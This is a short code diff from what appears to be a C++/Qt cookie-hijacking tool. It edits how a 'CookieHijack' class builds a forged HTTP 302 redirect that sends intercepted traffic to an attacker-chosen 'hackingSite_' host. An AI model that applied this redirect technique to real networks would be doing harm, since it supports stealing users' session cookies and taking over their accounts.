@@ -49,14 +49,14 @@ bool CookieHijack::doOpen() {
 	dnsBlock_.writer_.intfName_ = intfName;
 
 	QStringList httpResponse;
-	httpResponse += "HTTP/1.1 302 Redirect";
+	httpResponse += "HTTP/1.1 302 CPRedirect";
 	QString locationStr;
 	if (prefix_ == "")
 		locationStr = QString("Location: http://%1").arg(hackingSite_);
 	else
 		locationStr =  QString("Location: http://%1.%2").arg(prefix_).arg(hackingSite_);
 	if (webServer_.httpPort_ != 80) locationStr += ":" + QString::number(webServer_.httpPort_);
-	locationStr += "/start";
+	locationStr += "/" + hackingSite_;
 	httpResponse += locationStr;
 	httpResponse += "Connection: close";
 	httpResponse += "";
